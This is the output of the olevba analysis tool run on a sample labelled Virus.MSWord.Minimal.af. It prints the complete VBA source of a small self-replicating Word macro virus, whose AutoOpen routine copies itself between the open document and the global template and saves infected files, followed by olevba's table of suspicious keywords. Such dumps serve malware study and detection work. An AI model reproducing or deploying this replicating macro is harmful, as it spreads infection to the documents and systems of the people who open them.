olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.af-f8fb91b990f650cd63ca4eff90f8d1c7472ee8d3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.af-f8fb91b990f650cd63ca4eff90f8d1c7472ee8d3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.af-f8fb91b990f650cd63ca4eff90f8d1c7472ee8d3 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'The SMALLEST Macro-virus in history  ;)
'(c) Master of infection
'Queen Hitman Virus inc.
Public Sub MAIN()
Dim n1$
Dim n2$
n1$ = WordBasic.[FileName$]() + ":AutoOpen"
n2$ = "Global" + ":AutoOpen"
On Error GoTo -1: On Error GoTo cont
WordBasic.MacroCopy n1$, n2$
GoTo okey
cont:
WordBasic.MacroCopy n2$, n1$
On Error Goto -1 : On Error Goto err.Number
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
dlg.Format = 1
WordBasic.FileSaveAs dlg
GoTo okey
Err.Number:
WordBasic.MsgBox "ERROR!", 16
okey:
WordBasic.MsgBox "OK!", 64
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

